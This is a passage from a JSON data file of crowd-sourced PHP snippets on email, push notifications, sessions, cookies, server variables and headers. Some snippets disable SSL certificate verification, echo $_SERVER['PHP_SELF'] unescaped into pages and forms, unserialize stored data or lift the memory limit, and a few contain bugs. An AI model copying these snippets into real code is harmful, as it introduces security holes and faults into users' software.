 if (mail($mailto, $subject, $body, $headers)) {         echo \"mail send ... OK\"; // or use booleans here     } else {         echo \"mail send ... ERROR!\";         print_r( error_get_last() );     } \n// use this library -> https://github.com/PHPMailer/PHPMailer  <?php use PHPMailer\\PHPMailer\\PHPMailer; use PHPMailer\\PHPMailer\\SMTP; use PHPMailer\\PHPMailer\\Exception; function sendEmail(){   \trequire 'phpmailer/vendor/autoload.php';\t      //Create an instance; passing `true` enables exceptions     $mail = new PHPMailer(true);     $mail->CharSet = 'UTF-8';   try {       $receiver = 'test@gmail.com';       $name = 'Name';        //Server settings       $mail->SMTPDebug = 1;                      //Enable verbose debug output       $mail->isSMTP();                                            //Send using SMTP       $mail->Host       = 'tls://smtp.gmail.com';                     //Set the SMTP server to send through       $mail->SMTPAuth   = true;                                   //Enable SMTP authentication       $mail->Username   = 'username@gmail.com';                     //SMTP username       $mail->Password   = 'PASSWORD';                               //SMTP password       $mail->SMTPSecure = tls;            //Enable implicit TLS encryption       $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`        //Recipients       $mail->From = 'test@gmail.com';       $mail->setFrom('test@gmail.com', 'Name');       $mail->addAddress($receiver, $name);     //Add a recipient        //Content       $mail->isHTML(true);                                  //Set email format to HTML       $mail->Subject = 'Subject';       $mail->Body    = 'Body';        $mail->send();       echo 'Message has been sent';   } catch (Exception $e) {       echo \"Message could not be sent. Mailer Error: {$mail->ErrorInfo}\";   } } ?>\n<?php     mail(\"recipient@example.com\",         \"This is the message subject\",         \"This is the message body\",         \"From: sender@example.com\" . \"\\r\\n\" . \"Content-Type: text/plain; charset=utf-8\",         \"-fsender@example.com\"); ?>\n<?php $to      = 'nobody@example.com'; $subject = 'the subject'; $message = 'hello'; $headers = 'From: Jack Sparrow <jsparrow@blackpearl.com>' . PHP_EOL .     'Reply-To: Jack Sparrow <jsparrow@blackpearl.com>' . PHP_EOL .     'X-Mailer: PHP/' . phpversion();  mail($to, $subject, $message, $headers); ?>\n",
    "reg_date": "2021-10-12T10:19:16.000Z"
  },
  {
    "id": 4153,
    "keyword": null,
    "link": null,
    "title": " php send email with attachment",
    "description": "    $filename = 'myfile';     $path = 'your path goes here';     $file = $path . \"/\" . $filename;      $mailto = 'mail@mail.com';     $subject = 'Subject';     $message = 'My message';      $content = file_get_contents($file);     $content = chunk_split(base64_encode($content));      // a random hash will be necessary to send mixed content     $separator = md5(time());      // carriage return type (RFC)     $eol = \"\\r\\n\";      // main header (multipart mandatory)     $headers = \"From: name <test@test.com>\" . $eol;     $headers .= \"MIME-Version: 1.0\" . $eol;     $headers .= \"Content-Type: multipart/mixed; boundary=\\\"\" . $separator . \"\\\"\" . $eol;     $headers .= \"Content-Transfer-Encoding: 7bit\" . $eol;     $headers .= \"This is a MIME encoded message.\" . $eol;      // message     $body = \"--\" . $separator . $eol;     $body .= \"Content-Type: text/plain; charset=\\\"iso-8859-1\\\"\" . $eol;     $body .= \"Content-Transfer-Encoding: 8bit\" . $eol;     $body .= $message . $eol;      // attachment     $body .= \"--\" . $separator . $eol;     $body .= \"Content-Type: application/octet-stream; name=\\\"\" . $filename . \"\\\"\" . $eol;     $body .= \"Content-Transfer-Encoding: base64\" . $eol;     $body .= \"Content-Disposition: attachment\" . $eol;     $body .= $content . $eol;     $body .= \"--\" . $separator . \"--\";      //SEND Mail     if (mail($mailto, $subject, $body, $headers)) {         echo \"mail send ... OK\"; // or use booleans here     } else {         echo \"mail send ... ERROR!\";         print_r( error_get_last() );     } \n",
    "reg_date": "2021-10-12T10:19:16.000Z"
  },
  {
    "id": 4154,
    "keyword": null,
    "link": null,
    "title": " php send ios push notification",
    "description": "<?php  $deviceToken = '8845ba7c41e95e12caea6381ea6f01b5cd7b59a52feb9005e0727a65a4105dc2a0';  $passphrase = '';  $message = 'Your message';   $ctx = stream_context_create(); stream_context_set_option($ctx, 'ssl', 'local_cert', 'ck.pem'); stream_context_set_option($ctx, 'ssl', 'passphrase', $passphrase);  // Open a connection to the APNS server $fp = stream_socket_client('ssl://gateway.sandbox.push.apple.com:2195', $err, $errstr, 60, STREAM_CLIENT_CONNECT|STREAM_CLIENT_PERSISTENT, $ctx);  if (!$fp)     exit(\"Failed to connect: $err $errstr\" . PHP_EOL);  echo 'Connected to APNS' . PHP_EOL;   $body['aps'] = array(     'alert' => array(         'body' => $message,         'action-loc-key' => 'Bango App',     ),     'badge' => 2,     'sound' => 'oven.caf',     );  $payload = json_encode($body);  // Build the binary notification $msg = chr(0) . pack('n', 32) . pack('H*', $deviceToken) . pack('n', strlen($payload)) . $payload;   $result = fwrite($fp, $msg, strlen($msg));  if (!$result)     echo 'Message not delivered' . PHP_EOL; else     echo 'Message successfully delivered' . PHP_EOL;  fclose($fp);\n<?php  define( 'API_ACCESS_KEY', 'AIza......Xhdsnkf' ); // get API access key from Google/Firebase API's Console  $registrationIds = array( 'cyMSGTKBzwU:APA91...xMKgjgN32WfoJY6mI' ); //Replace this with your device token   // Modify custom payload here $msg = array (         'mesgTitle'     => 'SMART TESTING',         'alert'         => 'This is sample notification'  ); $fields = array (     'registration_ids'      => $registrationIds,     'data'                  => $msg );  $headers = array (     'Authorization: key=' . API_ACCESS_KEY,     'Content-Type: application/json' );  $ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://android.googleapis.com/gcm/send' ); //For firebase, use https://fcm.googleapis.com/fcm/send  curl_setopt( $ch,CURLOPT_POST, true ); curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers ); curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true ); curl_setopt( $ch,CURLOPT_SSL_VERIFYPEER, false ); curl_setopt( $ch,CURLOPT_POSTFIELDS, json_encode( $fields ) ); $result = curl_exec($ch ); curl_close( $ch ); echo $result;  ?> \n",
    "reg_date": "2021-10-12T10:19:16.000Z"
  },
  {
    "id": 4155,
    "keyword": null,
    "link": null,
    "title": " php send put request",
    "description": "<?php   //The URL that we want to send a PUT request to. $url = 'http://localhost/tester/log.php';   //Initiate cURL $ch = curl_init($url);   //Use the CURLOPT_PUT option to tell cURL that //this is a PUT request. curl_setopt($ch, CURLOPT_PUT, true);   //We want the result / output returned. curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);   //Our fields. $fields = array(\"id\" => 1); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($fields));   //Execute the request. $response = curl_exec($ch);   echo $response; \n",
    "reg_date": "2021-10-12T10:19:16.000Z"
  },
  {
    "id": 4156,
    "keyword": null,
    "link": null,
    "title": " php send when user log in discord webhook",
    "description": "function postToDiscord() {     $data = array(\"content\" => \"Your Content\", \"username\" => \"Webhooks\");     $curl = curl_init(\"https://discordapp.com/api/webhooks/YOUR-WEBHOOK-URL-HERE\");     curl_setopt($curl, CURLOPT_CUSTOMREQUEST, \"POST\");     curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($data));     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);     return curl_exec($curl); }\n",
    "reg_date": "2021-10-12T10:19:16.000Z"
  },
  {
    "id": 4157,
    "keyword": null,
    "link": null,
    "title": " php serialize()",
    "description": "$array[\"a\"] = \"Foo\"; $array[\"b\"] = \"Bar\"; $array[\"c\"] = \"Baz\"; $array[\"d\"] = \"Wom\";  $str = serialize($array);\nphp array to be storable value in $_SESSION:  serialize($array)   serialized array element to be output on page: unserialize($serializedArray)\n//If you plan to serialize and store it in file or database use below syntax //to safely serialize $safe_string_to_store = base64_encode(serialize($multidimensional_array));  //to unserialize... $array_restored_from_db = unserialize(base64_decode($encoded_serialized_string));\nserializer in php  PHP: serialize()\n",
    "reg_date": "2021-10-12T10:19:16.000Z"
  },
  {
    "id": 4158,
    "keyword": null,
    "link": null,
    "title": " php serialize array",
    "description": "$array[\"a\"] = \"Foo\"; $array[\"b\"] = \"Bar\"; $array[\"c\"] = \"Baz\"; $array[\"d\"] = \"Wom\";  $str = serialize($array);\nphp array to be storable value in $_SESSION:  serialize($array)   serialized array element to be output on page: unserialize($serializedArray)\n//If you plan to serialize and store it in file or database use below syntax //to safely serialize $safe_string_to_store = base64_encode(serialize($multidimensional_array));  //to unserialize... $array_restored_from_db = unserialize(base64_decode($encoded_serialized_string));\nserializer in php  PHP: serialize()\n",
    "reg_date": "2021-10-12T10:19:16.000Z"
  },
  {
    "id": 4159,
    "keyword": null,
    "link": null,
    "title": " php serve",
    "description": "cd path/to/your/app php -S localhost:8000\nOpen Terminal php -S localhost:8000\n// to serve folder foo in public $ cd ~/public $ php -S localhost:8000 -t foo/\ncd path/to/your/app php -S 127.0.0.1:8000\nsimple built-in php server\n",
    "reg_date": "2021-10-12T10:19:16.000Z"
  },
  {
    "id": 4160,
    "keyword": null,
    "link": null,
    "title": " php server",
    "description": "cd path/to/your/app php -S localhost:8000\nOpen Terminal php -S localhost:8000\n// to serve folder foo in public $ cd ~/public $ php -S localhost:8000 -t foo/\n1) cd ~/public_html 2) php -S localhost:8000\ncd path/to/your/app php -S 127.0.0.1:8000\nphp -S localhost:8000 -t ./\n",
    "reg_date": "2021-10-12T10:19:17.000Z"
  },
  {
    "id": 4161,
    "keyword": null,
    "link": null,
    "title": " php server function",
    "description": "echo $_SERVER['PHP_SELF']; echo \"<br>\"; echo $_SERVER['SERVER_NAME']; echo \"<br>\"; echo $_SERVER['HTTP_HOST']; echo \"<br>\"; // echo $_SERVER['HTTP_REFERER']; echo \"<br>\"; echo $_SERVER['HTTP_USER_AGENT']; echo \"<br>\"; echo $_SERVER['SCRIPT_NAME'];\n<?php   // PHP $_SERVER['...']; method      // PHP file name   echo 'PHP file name: '.$_SERVER['PHP_SELF'].'<br>';   // Server name   echo 'Server name: '.$_SERVER['SERVER_NAME'].'<br>';   // HTTP host   echo 'HTTP host: '.$_SERVER['HTTP_HOST'].'<br>';   // Refering link   echo 'Refering link: '.$_SERVER['HTTP_REFERER'].'<br>';   // User agent   echo 'User agent: '.$_SERVER['HTTP_USER_AGENT'].'<br>';   // Script name   echo 'Script name: '.$_SERVER['SCRIPT_NAME'];      // The rest is optional    if($_SERVER['PHP_SELF']=='/filename.php'){     //If there is no folder     echo 'No folder'.$_SERVER['PHP_SELF'];   } else{     // Echo the name of the folder containing the PHP file     echo 'PHP file name: '.$_SERVER['PHP_SELF'];   }      // The same if statements can be used for the script name      if($_SERVER['SCRIPT_NAME']=='/filename.php'){     // If there is no folder     echo 'No folder'.$_SERVER['SCRIPT_NAME'];   } else{     // Echo the name of the folder containing the PHP file     echo 'PHP file name: '.$_SERVER['SCRIPT_NAME'];   }      echo '<a href=\"repl.it/@CoolWebDev\">More from me...</a>';      // I hope you found this helpful!  ?>\n",
    "reg_date": "2021-10-12T10:19:17.000Z"
  },
  {
    "id": 4162,
    "keyword": null,
    "link": null,
    "title": " php server name",
    "description": "echo $_SERVER['PHP_SELF']; echo \"<br>\"; echo $_SERVER['SERVER_NAME']; echo \"<br>\"; echo $_SERVER['HTTP_HOST']; echo \"<br>\"; // echo $_SERVER['HTTP_REFERER']; echo \"<br>\"; echo $_SERVER['HTTP_USER_AGENT']; echo \"<br>\"; echo $_SERVER['SCRIPT_NAME'];\n<?php   // PHP $_SERVER['...']; method      // PHP file name   echo 'PHP file name: '.$_SERVER['PHP_SELF'].'<br>';   // Server name   echo 'Server name: '.$_SERVER['SERVER_NAME'].'<br>';   // HTTP host   echo 'HTTP host: '.$_SERVER['HTTP_HOST'].'<br>';   // Refering link   echo 'Refering link: '.$_SERVER['HTTP_REFERER'].'<br>';   // User agent   echo 'User agent: '.$_SERVER['HTTP_USER_AGENT'].'<br>';   // Script name   echo 'Script name: '.$_SERVER['SCRIPT_NAME'];      // The rest is optional    if($_SERVER['PHP_SELF']=='/filename.php'){     //If there is no folder     echo 'No folder'.$_SERVER['PHP_SELF'];   } else{     // Echo the name of the folder containing the PHP file     echo 'PHP file name: '.$_SERVER['PHP_SELF'];   }      // The same if statements can be used for the script name      if($_SERVER['SCRIPT_NAME']=='/filename.php'){     // If there is no folder     echo 'No folder'.$_SERVER['SCRIPT_NAME'];   } else{     // Echo the name of the folder containing the PHP file     echo 'PHP file name: '.$_SERVER['SCRIPT_NAME'];   }      echo '<a href=\"repl.it/@CoolWebDev\">More from me...</a>';      // I hope you found this helpful!  ?>\n",
    "reg_date": "2021-10-12T10:19:17.000Z"
  },
  {
    "id": 4163,
    "keyword": null,
    "link": null,
    "title": " php server redirect to php file without php ending",
    "description": "Your .htaccess file would need to look something like this:  IndexIgnore * # prevent directory listing  Order deny,allow Allow from *  # ------------------------------------------ # Rewrite so that php extentions are not shown RewriteEngine on  RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME}\\.php -f RewriteRule ^(.*)$ $1.php\n",
    "reg_date": "2021-10-12T10:19:17.000Z"
  },
  {
    "id": 4164,
    "keyword": null,
    "link": null,
    "title": " php server request method",
    "description": "echo $_SERVER['PHP_SELF']; echo \"<br>\"; echo $_SERVER['SERVER_NAME']; echo \"<br>\"; echo $_SERVER['HTTP_HOST']; echo \"<br>\"; // echo $_SERVER['HTTP_REFERER']; echo \"<br>\"; echo $_SERVER['HTTP_USER_AGENT']; echo \"<br>\"; echo $_SERVER['SCRIPT_NAME'];\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {      // The request is using the POST method } \n$_SERVER['REQUEST_METHOD'];\n",
    "reg_date": "2021-10-12T10:19:17.000Z"
  },
  {
    "id": 4165,
    "keyword": null,
    "link": null,
    "title": " php server self",
    "description": "<form action=\"<?php echo $_SERVER['PHP_SELF']; ?>\">  //there is no reason to use this to submit form data to the same page <form action=\"\">  //will do the same thing\nCREATE DATABASE databasename;\n",
    "reg_date": "2021-10-12T10:19:17.000Z"
  },
  {
    "id": 4166,
    "keyword": null,
    "link": null,
    "title": " php server sent events",
    "description": "header('Content-Type: text/event-stream'); header('Cache-Control: no-cache');  while (true) {   \t$data = [     \t'name' => 'Rasmus Lerdorf'     ]    \techo \"event: sse\\n\";   \techo \"data: \" . json_encode($data) . \"\\n\\n\";     echo str_pad('', 4096) . \"\\n\";        \tob_flush();   \tflush();   \tsleep(1);    \tif (connection_aborted()) {     \tbreak;   \t} } ob_end_flush();\n",
    "reg_date": "2021-10-12T10:19:17.000Z"
  },
  {
    "id": 4167,
    "keyword": null,
    "link": null,
    "title": " php server variables",
    "description": "echo $_SERVER['PHP_SELF']; echo \"<br>\"; echo $_SERVER['SERVER_NAME']; echo \"<br>\"; echo $_SERVER['HTTP_HOST']; echo \"<br>\"; // echo $_SERVER['HTTP_REFERER']; echo \"<br>\"; echo $_SERVER['HTTP_USER_AGENT']; echo \"<br>\"; echo $_SERVER['SCRIPT_NAME'];\n//Just a PHP file to put on your local server (as I don't have enough memory) // Write the code by Md Abdur Rakib  <?php $indicesServer = array('PHP_SELF', 'argv', 'argc', 'GATEWAY_INTERFACE', 'SERVER_ADDR', 'SERVER_NAME', 'SERVER_SOFTWARE', 'SERVER_PROTOCOL', 'REQUEST_METHOD', 'REQUEST_TIME', 'REQUEST_TIME_FLOAT', 'QUERY_STRING', 'DOCUMENT_ROOT', 'HTTP_ACCEPT', 'HTTP_ACCEPT_CHARSET', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_CONNECTION', 'HTTP_HOST', 'HTTP_REFERER', 'HTTP_USER_AGENT', 'HTTPS', 'REMOTE_ADDR', 'REMOTE_HOST', 'REMOTE_PORT', 'REMOTE_USER', 'REDIRECT_REMOTE_USER', 'SCRIPT_FILENAME', 'SERVER_ADMIN', 'SERVER_PORT', 'SERVER_SIGNATURE', 'PATH_TRANSLATED', 'SCRIPT_NAME', 'REQUEST_URI', 'PHP_AUTH_DIGEST', 'PHP_AUTH_USER', 'PHP_AUTH_PW', 'AUTH_TYPE', 'PATH_INFO', 'ORIG_PATH_INFO') ;  echo '<table cellpadding=\"10\">' ; foreach ($indicesServer as $arg) {     if (isset($_SERVER[$arg])) {         echo '<tr><td>'.$arg.'</td><td>' . $_SERVER[$arg] . '</td></tr>' ;     }     else {         echo '<tr><td>'.$arg.'</td><td>-</td></tr>' ;     } } echo '</table>' ;  /*  That will give you the result of each variable like (if the file is server_indices.php at the root and Apache Web directory is in E:\\web) :  PHP_SELF    /server_indices.php argv    - argc    - GATEWAY_INTERFACE    CGI/1.1 SERVER_ADDR    127.0.0.1 SERVER_NAME    localhost SERVER_SOFTWARE    Apache/2.2.22 (Win64) PHP/5.3.13 SERVER_PROTOCOL    HTTP/1.1 REQUEST_METHOD    GET REQUEST_TIME    1361542579 REQUEST_TIME_FLOAT    - QUERY_STRING    DOCUMENT_ROOT    E:/web/ HTTP_ACCEPT    text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 HTTP_ACCEPT_CHARSET    ISO-8859-1,utf-8;q=0.7,*;q=0.3 HTTP_ACCEPT_ENCODING    gzip,deflate,sdch HTTP_ACCEPT_LANGUAGE    fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4 HTTP_CONNECTION    keep-alive HTTP_HOST    localhost HTTP_REFERER    http://localhost/ HTTP_USER_AGENT    Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17 HTTPS    - REMOTE_ADDR    127.0.0.1 REMOTE_HOST    - REMOTE_PORT    65037 REMOTE_USER    - REDIRECT_REMOTE_USER    - SCRIPT_FILENAME    E:/web/server_indices.php SERVER_ADMIN    myemail@personal.us SERVER_PORT    80 SERVER_SIGNATURE    PATH_TRANSLATED    - SCRIPT_NAME    /server_indices.php REQUEST_URI    /server_indices.php PHP_AUTH_DIGEST    - PHP_AUTH_USER    - PHP_AUTH_PW    - AUTH_TYPE    - PATH_INFO    - ORIG_PATH_INFO    -  */ ?> \n<?php   // PHP $_SERVER['...']; method      // PHP file name   echo 'PHP file name: '.$_SERVER['PHP_SELF'].'<br>';   // Server name   echo 'Server name: '.$_SERVER['SERVER_NAME'].'<br>';   // HTTP host   echo 'HTTP host: '.$_SERVER['HTTP_HOST'].'<br>';   // Refering link   echo 'Refering link: '.$_SERVER['HTTP_REFERER'].'<br>';   // User agent   echo 'User agent: '.$_SERVER['HTTP_USER_AGENT'].'<br>';   // Script name   echo 'Script name: '.$_SERVER['SCRIPT_NAME'];      // The rest is optional    if($_SERVER['PHP_SELF']=='/filename.php'){     //If there is no folder     echo 'No folder'.$_SERVER['PHP_SELF'];   } else{     // Echo the name of the folder containing the PHP file     echo 'PHP file name: '.$_SERVER['PHP_SELF'];   }      // The same if statements can be used for the script name      if($_SERVER['SCRIPT_NAME']=='/filename.php'){     // If there is no folder     echo 'No folder'.$_SERVER['SCRIPT_NAME'];   } else{     // Echo the name of the folder containing the PHP file     echo 'PHP file name: '.$_SERVER['SCRIPT_NAME'];   }      echo '<a href=\"repl.it/@CoolWebDev\">More from me...</a>';      // I hope you found this helpful!  ?>\n",
    "reg_date": "2021-10-12T10:19:17.000Z"
  },
  {
    "id": 4168,
    "keyword": null,
    "link": null,
    "title": " php session destroy",
    "description": "// destroy the session <?php session_destroy(); ?>\nsession_destroy(); // To delete whole session // OR unset($_SESSION['myVar']); // To delete a session var\n<?php   session_start(); // start session  session_destroy();  // Delete whole session // OR unset($_SESSION['username']); // delete any specific session only ?>\n<?php    unset($_SESSION['counter']); ?>\nsession_unset();    //Destrol all session variables\n<?php // Destroy the currently active session. session_destroy(); ?>\n",
    "reg_date": "2021-10-12T10:19:17.000Z"
  },
  {
    "id": 4169,
    "keyword": null,
    "link": null,
    "title": " php session name",
    "description": "<?php   session_name( 'fObj' );   session_start();    print_r($_SESSION); \n",
    "reg_date": "2021-10-12T10:19:18.000Z"
  },
  {
    "id": 4170,
    "keyword": null,
    "link": null,
    "title": " php session regenerate id",
    "description": "<?php session_start();  $old_sessionid = session_id();  session_regenerate_id();  $new_sessionid = session_id();  echo \"Old Session: $old_sessionid<br />\"; echo \"New Session: $new_sessionid<br />\"; ?>\n",
    "reg_date": "2021-10-12T10:19:18.000Z"
  },
  {
    "id": 4171,
    "keyword": null,
    "link": null,
    "title": " php session time out default",
    "description": "The default lifetime of a session in PHP is 1440 seconds, or 24 minutes\n24 minutes It depends on the server configuration or the relevant directives session. gc_maxlifetime in php. ini . Typically the default is 24 minutes (1440 seconds), but your webhost may have altered the default to something else\n",
    "reg_date": "2021-10-12T10:19:18.000Z"
  },
  {
    "id": 4172,
    "keyword": null,
    "link": null,
    "title": " php session variables",
    "description": "<?php   session_start(); // start session  session_destroy();  // Delete whole session // OR unset($_SESSION['username']); // delete any specific session only ?>\n<?php   \t// Start new or resume existing session.   \tsession_start(); \t \t// Add values to the session. \t$_SESSION['item_name'] = 'value'; // string \t$_SESSION['item_name'] = 0; // int \t$_SESSION['item_name'] = 0.0; // float  \t// Get session values. \t$value = $_SESSION['item_name']; ?>\n<?php    // Start the session   session_start(); ?> <!DOCTYPE html> <html>   <body>   <?php     // Set session variables     $_SESSION[\"color\"]= \"blue\";     $_SESSION[\"animal\"]= \"dog\";     echo \"The session variable are set up.\";   ?>   </body> </html>\n<?php    // Start the session   session_start();    // Set session variables   $_SESSION[\"color\"]= \"blue\";   $_SESSION[\"animal\"]= \"dog\";   echo \"The session variable are set up.\"; ?>\n<?php    session_start();    $_SESSION['var']; ?>\n/*Sessions are stored on the server Sessions are a way to carry data across multiple pages.  Typically if we set a variable on one page, it wouldn't be available  on the next page. This is where Sessions come in. Unlike cookies session data is not stored on the user's computer. It is stored on the server.  In order to use session variables you have to start a session.  Every page, that you want to use that data in, you have to use  session_start.  If you want to unset one of these sessions you can use session_unset  youcan destry the session with session_destroy */  <?php if(isset($_POST['submit'])) { session_start(); // that will start the session $_SESSION['name'] = htmlentities($_POST['name']); $_SESSION['email'] = htmlentities($_POST['email']); header('Location: page2.php'); } ?> <!DOCTYPE html> <html> <head> <title>PHP Sessions</title> </head> <body> <form method=\"POST\" action=\"<?php echo $server['PHP_SELF'];?>\"> <input type=\"text\" name=\"name\" placeholder=\"Enter Name\"> <br> <input type=\"text\" name=\"email\" placeholder=\"Enter Email\"> <br> <input type=\"submit\" name=\"submit\" value=\"submit\"> </form> </body> </html>\n",
    "reg_date": "2021-10-12T10:19:18.000Z"
  },
  {
    "id": 4173,
    "keyword": null,
    "link": null,
    "title": " php sessions",
    "description": "<?php   session_start(); // start session  session_destroy();  // Delete whole session // OR unset($_SESSION['username']); // delete any specific session only ?>\n<?php   \t// Start new or resume existing session.   \tsession_start(); \t \t// Add values to the session. \t$_SESSION['item_name'] = 'value'; // string \t$_SESSION['item_name'] = 0; // int \t$_SESSION['item_name'] = 0.0; // float  \t// Get session values. \t$value = $_SESSION['item_name']; ?>\n<?php    // Start the session   session_start(); ?> <!DOCTYPE html> <html>   <body>   <?php     // Set session variables     $_SESSION[\"color\"]= \"blue\";     $_SESSION[\"animal\"]= \"dog\";     echo \"The session variable are set up.\";   ?>   </body> </html>\n<?php    // Start the session   session_start();    // Set session variables   $_SESSION[\"color\"]= \"blue\";   $_SESSION[\"animal\"]= \"dog\";   echo \"The session variable are set up.\"; ?>\n<?php    session_start();    $_SESSION['var']; ?>\n/*Sessions are stored on the server Sessions are a way to carry data across multiple pages.  Typically if we set a variable on one page, it wouldn't be available  on the next page. This is where Sessions come in. Unlike cookies session data is not stored on the user's computer. It is stored on the server.  In order to use session variables you have to start a session.  Every page, that you want to use that data in, you have to use  session_start.  If you want to unset one of these sessions you can use session_unset  youcan destry the session with session_destroy */  <?php if(isset($_POST['submit'])) { session_start(); // that will start the session $_SESSION['name'] = htmlentities($_POST['name']); $_SESSION['email'] = htmlentities($_POST['email']); header('Location: page2.php'); } ?> <!DOCTYPE html> <html> <head> <title>PHP Sessions</title> </head> <body> <form method=\"POST\" action=\"<?php echo $server['PHP_SELF'];?>\"> <input type=\"text\" name=\"name\" placeholder=\"Enter Name\"> <br> <input type=\"text\" name=\"email\" placeholder=\"Enter Email\"> <br> <input type=\"submit\" name=\"submit\" value=\"submit\"> </form> </body> </html>\n",
    "reg_date": "2021-10-12T10:19:18.000Z"
  },
  {
    "id": 4174,
    "keyword": null,
    "link": null,
    "title": " php set charset utf 8",
    "description": "header('Content-Type: text/html; charset=utf-8');\n<?php $mysqli = new mysqli(\"localhost\",\"my_user\",\"my_password\",\"my_db\");  if ($mysqli -> connect_errno) {   echo \"Failed to connect to MySQL: \" . $mysqli -> connect_error;   exit(); }  echo \"Initial character set is: \" . $mysqli -> character_set_name();  // Change character set to utf8 $mysqli -> set_charset(\"utf8\");  echo \"Current character set is: \" . $mysqli -> character_set_name();  $mysqli -> close(); ?>\n",
    "reg_date": "2021-10-12T10:19:18.000Z"
  },
  {
    "id": 4175,
    "keyword": null,
    "link": null,
    "title": " php set cookie",
    "description": "setcookie($cookiename, $cookievalue, time() + (86400 * 30), \"/\"); // 86400 = 1 day\n//Parameter of Cookie  //only first line is usable other lines is for descrption setcookie($cookiename ,$cookievalue , time() + (86400 * 10) , \"/\" , domain.com ,True , False);   //Explanation setcookie(name , value, time, path, domain , secure, httponly)   1.name is the name of cookie   2.value is the value that you want to save in cookie   3.time is expire time of cookie and it is set in sec so 86400 sec is   equal to 1 day time() function get the current time and 86400 * 10 means   after 10 days cookie will be expire   4.path is path of  website to access coookie if we use \"/\" it means we can      access cookie from every page   5.domain is the domain from which you want to access the cookie if we use      domain then we only access cookie from that specific domain   6.secure means HTTPs protocol if its True it means cookie only set if its      HTTPs otherwise cookie cannot set   7.HTTPonly means if its false we can access cookie from localsite(javascript)     and serversite but if its Ture other wise from only serversite (php)\nsetcookie('username',$username,time()+60*60*24*365); // 'Force' the cookie to exists $_COOKIE['username'] = $username;\n<?php   $name = 'COOKIE_NAME';   $value = 'VALUE';   $expireTime = strtotime('+1 years');   $path = '/';   setcookie($name,$value,$expireTime,$path); \nsetcookie(\"cookiename\", \"cookievalue\", time(), \".mydomain.tld\", \"/\")  // coookiename: The name of your cookie // cookievalue: The value of your cookie // Time: The expiration date of your cookie. If you plan to make a product for the EU, it's 13 months max. // .mydomain.tld: The domain that your webpage is using. You can only use the domain that the PHP file is on. Adding a dot before your domain will cover all subdomains. // \"/\": This is the folder where your cookie will apply. If you want a specific cookie for the /mySpecialSuperSecretPages folder, you have to set /mySpecialSuperSecretPages // Check the source for more options.\nsetcookie(\"cookie_name\", \"type_on_cookie\", expiry_time(), \"/\");\n",
    "reg_date": "2021-10-12T10:19:18.000Z"
  },
  {
    "id": 4176,
    "keyword": null,
    "link": null,
    "title": " php set environment variable",
    "description": "$value = getenv(\"VARNAME\"); // returns FALSE if VARNAME does not exist  $env_vars = getenv(); // if no name is specified, an associative array  // with all environment variables is returned\nputenv('NAME=VALUE');  // NAME may contain whitespaces -> putenv('NAME=VALUE')  // is not equivalent to  putenv('NAME = VALUE') \n",
    "reg_date": "2021-10-12T10:19:18.000Z"
  },
  {
    "id": 4177,
    "keyword": null,
    "link": null,
    "title": " php set error log file",
    "description": "ini_set(\"log_errors\", 1); // Enable error logging ini_set(\"error_log\", \"/tmp/php-error.log\"); // set error path error_log( \"Hello, errors!\" ); // log a test error \n/usr/local/apache/logs/error_log\n",
    "reg_date": "2021-10-12T10:19:18.000Z"
  },
  {
    "id": 4178,
    "keyword": null,
    "link": null,
    "title": " php set header content type html",
    "description": "// set header to HTML (default) header(\"Content-Type: text/html\");  // set header to Text header('Content-type: text/plain');\n",
    "reg_date": "2021-10-12T10:19:18.000Z"
  },
  {
    "id": 4179,
    "keyword": null,
    "link": null,
    "title": " php set header to utf-8",
    "description": "header('Content-Type: text/html; charset=utf-8');\n",
    "reg_date": "2021-10-12T10:19:18.000Z"
  },
  {
    "id": 4180,
    "keyword": null,
    "link": null,
    "title": " php set http code",
    "description": "/* Example #1 Using http_response_code() in a web server environment --------------------------------------------------------------------*/ // Get the current response code and set a new one var_dump(http_response_code(404));  // output: 200 // Get the new response code var_dump(http_response_code());     // output: 404  /* Example #2 Using http_response_code() in a CLI environment -------------------------------------------------------------*/ // Get the current default response code var_dump(http_response_code());     // output: false // Set a response code var_dump(http_response_code(201));  // output: true // Get the new response code var_dump(http_response_code());     // output: 201\n",
    "reg_date": "2021-10-12T10:19:19.000Z"
  },
  {
    "id": 4181,
    "keyword": null,
    "link": null,
    "title": " php set no memory limit",
    "description": "//Unlimited momory limit ini_set('memory_limit', '-1');  //Fixed memory limit ini_set('memory_limit','2048M');\n",
    "reg_date": "2021-10-12T10:19:19.000Z"
  },
  {
    "id": 4182,
    "keyword": null,
    "link": null,
    "title": " php set selected option",
    "description": "//use this while you are looping throw the row. <option value=\"myValue\"<?=$row['value'] == 'myValue' ? ' selected=\"selected\"' : ''?>>myValue</option> \n",
    "reg_date": "2021-10-12T10:19:19.000Z"
  },
  {
    "id": 4183,
    "keyword": null,
    "link": null,
    "title": " php set session timeout",
    "description": "//Ending a php session after 30 minutes of inactivity  $minutesBeforeSessionExpire=30;  if (isset($_SESSION['LAST_ACTIVITY']) && (time() - $_SESSION['LAST_ACTIVITY'] > ($minutesBeforeSessionExpire*60))) {      session_unset();     // unset $_SESSION         session_destroy();   // destroy session data    }  $_SESSION['LAST_ACTIVITY'] = time(); // update last activity\n",
    "reg_date": "2021-10-12T10:19:19.000Z"
  },
  {
    "id": 4184,
    "keyword": null,
    "link": null,
    "title": " php set timezone italy",
    "description": "date_default_timezone_set('Europe/Rome'); $italy_current_time = date(\"Y-m-d H:i:s\");\n",
    "reg_date": "2021-10-12T10:19:19.000Z"
  },
  {
    "id": 4185,
    "keyword": null,
    "link": null,
    "title": " php set utf8 encoding",
